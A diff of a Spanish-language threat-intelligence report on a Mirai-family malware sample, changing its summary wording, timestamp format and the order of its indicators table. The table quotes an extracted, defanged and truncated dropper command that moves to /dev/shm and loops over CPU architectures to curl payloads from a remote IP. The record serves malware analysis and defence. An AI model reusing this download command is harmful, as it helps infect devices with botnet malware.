@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Reconocimiento del sistema, Descarga remota. Se asociaron 2 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Reconocimiento del sistema, Descarga remota. Se identificaron 2 comandos observados o extraídos. Se identificaron 5 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:36:46+00:00`
+- **Registrado:** `2026-08-09T19:36:46.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,11 +54,11 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 103.211.206.XXX | static_analysis |
 | url | hxxp://103.211.206.XXX/main_$ | strings |
-| hash | 2a924709fb52d53ce5b282b855c54475afc0ed788b7bdc23faa078800cbe5e56 | static_analysis |
+| ip | 103.211.206.XXX | static_analysis |
 | command | [4hroot@ubnt:~# cd /dev/shm; for arch in x86_64 armv7l mips mipsel; do curl -fsSLk hxxp://103.211.206.XXX/main_${arch} -o | strings |
 | command | [4lchmod: cannot access '.sysd': No such file or directory | strings |
+| hash | 2a924709fb52d53ce5b282b855c54475afc0ed788b7bdc23faa078800cbe5e56 | static_analysis |
 | ip | [internal-ip-redacted] | artifact_source |
 
 ## 🛡️ Nota de publicación
